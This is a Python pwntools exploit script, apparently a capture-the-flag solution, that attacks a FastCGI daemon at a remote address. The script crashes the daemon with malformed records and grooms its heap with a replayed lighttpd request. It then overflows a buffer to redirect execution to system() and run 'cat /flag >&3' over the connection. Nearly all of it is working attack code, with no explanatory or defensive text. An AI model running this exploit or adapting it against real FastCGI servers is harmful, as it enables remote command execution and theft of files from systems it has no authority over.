#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.log_level = "debug"
context.arch = "i386"

def start(argv=[], *a, **kw):
    #return remote("127.0.0.1", 9999)
    return remote("35.220.136.70", 30777)

"""
typedef struct {
    unsigned char version;
    unsigned char type;
    unsigned char requestIdB1;
    unsigned char requestIdB0;
    unsigned char contentLengthB1;
    unsigned char contentLengthB0;
    unsigned char paddingLength;
    unsigned char reserved;
} FCGI_Header;
"""

def makeHeader(type, requestId, contentLength, paddingLength):
    header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0)
    return header

"""
typedef struct {
    unsigned char roleB1;
    unsigned char roleB0;
    unsigned char flags;
    unsigned char reserved[5];
} FCGI_BeginRequestBody;
"""

def makeBeginReqBody(role, flags):
    return p16(role)[::-1] + p8(flags) + b"\x00" * 5
    
# crash and restart daemon
io = start()
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + makeHeader(9, 0, 900, 0) + (p8(0x13) + p8(0x13) + b"b" * 0x26)*1 + p32(0xffffffff) + p32(0xffffffff) + p32(0xdeadbeef)*0x30)
io.close()
pause(3) # restarting...

# curl http://127.0.0.1:9999/ => heap fengshui
io = start()
io.send(b'\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01\x01\x9b\x00\x00\x0e\x01CONTENT_LENGTH0\x0c\x00QUERY_STRING\x0b\x01REQUEST_URI/\x0f\x03REDIRECT_STATUS200\x0b\x01SCRIPT_NAME/\x0f\x05SCRIPT_FILENAME/www/\r\x04DOCUMENT_ROOT/www\x0e\x03REQUEST_METHODGET\x0f\x08SERVER_PROTOCOLHTTP/1.1\x0f\x0fSERVER_SOFTWARElighttpd/1.4.79\x11\x07GATEWAY_INTERFACECGI/1.1\x0e\x04REQUEST_SCHEMEhttp\x0b\x04SERVER_PORT8888\x0b\tSERVER_ADDR127.0.0.1\x0b\tSERVER_NAME127.0.0.1\x0b\tREMOTE_ADDR127.0.0.1\x0b\x05REMOTE_PORT36190\t\x0eHTTP_HOST127.0.0.1:8888\x0f\nHTTP_USER_AGENTcurl/8.5.0\x0b\x03HTTP_ACCEPT*/*\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00\x00\x00\x00')
io.close()

# exploit and read '/flag'
io = start()
system_plt = 0x80490c0
print(hex(system_plt))
io.send(makeHeader(1, 1, 8, 0) + makeBeginReqBody(1, 0) + makeHeader(9, 0, 900, 0) + (p8(0x13) + p8(0x13) + b"b" * 0x26)*1 + ((p8(0) * 2) * 1) + p32(0xffffffff) + p32(0xffffffff) + p32(0xdeadbeef)*12  + b"aaa; cat /flag >&3".ljust(4*5, b"\x00") +p32(0) * 3 + p32(system_plt) + p32(0xdeadbeef) )
io.interactive()
